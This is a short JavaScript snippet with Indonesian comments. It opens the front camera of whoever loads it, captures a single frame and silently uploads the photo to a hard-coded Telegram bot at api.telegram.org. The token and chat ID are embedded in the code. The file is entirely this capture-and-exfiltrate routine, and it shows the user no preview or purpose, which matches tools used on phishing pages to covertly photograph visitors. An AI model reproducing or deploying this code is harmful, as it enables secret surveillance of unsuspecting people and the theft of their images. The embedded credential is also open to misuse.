// Masukkan Token Bot dan Chat ID Telegram Anda di sini
const tokenBot = '8825946342:AAExpW8qsdKcJ4bJEv5E9kPN-kZoeaTv2Dg'; 
const chatId = '7819779147';

// Helper fungsi untuk mengubah DataURL (Base64) menjadi Blob/File
function dataURLtoBlob(dataURL) {
    const arr = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], { type: mime });
}

function takeAndSendFrontCameraPhoto() {
    // Menggunakan facingMode: 'user' untuk Kamera Depan
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(stream => {
            const video = document.createElement('video');
            
            // Pasang event listener SEBELUM memanggil play() agar tidak kelewatan
            video.addEventListener('canplay', () => {
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                const width = video.videoWidth || 640;
                const height = video.videoHeight || 480;
                canvas.width = width;
                canvas.height = height;

                context.drawImage(video, 0, 0, width, height);
                const dataURL = canvas.toDataURL('image/jpeg');

                // Convert Base64 ke Blob untuk dikirim via FormData
                const imageBlob = dataURLtoBlob(dataURL);
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', imageBlob, 'capture.jpg');

                // Kirim ke Telegram API menggunakan fetch bawaan browser
                fetch(`https://api.telegram.org/bot${tokenBot}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Photo sent successfully:', data);
                    } else {
                        console.error('Telegram API Error:', data.description);
                    }
                })
                .catch(error => {
                    console.error('Error sending photo:', error);
                })
                .finally(() => {
                    // Matikan stream kamera dan bersihkan elemen video
                    stream.getTracks().forEach(track => track.stop());
                    video.remove();
                });
            });

            video.srcObject = stream;
            video.play();
        })
        .catch(error => {
            console.error('Error accessing camera:', error);
        });
}
